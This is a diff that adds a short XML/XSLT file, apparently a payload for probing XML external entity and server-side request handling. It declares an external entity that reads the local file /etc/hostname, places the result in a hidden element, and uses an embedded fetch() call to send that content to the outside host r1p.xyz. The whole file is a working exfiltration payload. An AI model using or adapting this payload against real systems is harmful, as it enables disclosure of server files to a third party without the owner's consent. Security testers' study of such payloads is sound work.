@@ -1,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<?xml-stylesheet type="text/xsl" href="?#"?>
+<!DOCTYPE div [
+  <!ENTITY passwd_p        "https://r1p.xyz/test.txt">
+  <!ENTITY passwd_c SYSTEM "file:///etc/hostname">
+]>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+  <xsl:template match="/">
+    <xsl:copy-of select="document('')"/>
+    <body xmlns="http://www.w3.org/1999/xhtml">
+      <div style="display:none">
+        <p id="x" class="&passwd_p;">&passwd_c;</p>
+      </div>
+      <div style="width:40rem" id="r" />
+      <script>
+	  fetch('https://r1p.xyz/ssrf/?x='+document.getElementById("x").innerHTML, {
+    method: 'GET',
+    mode: 'no-cors'
+});
+      </script>
+    </body>
+  </xsl:template>
+</xsl:stylesheet>
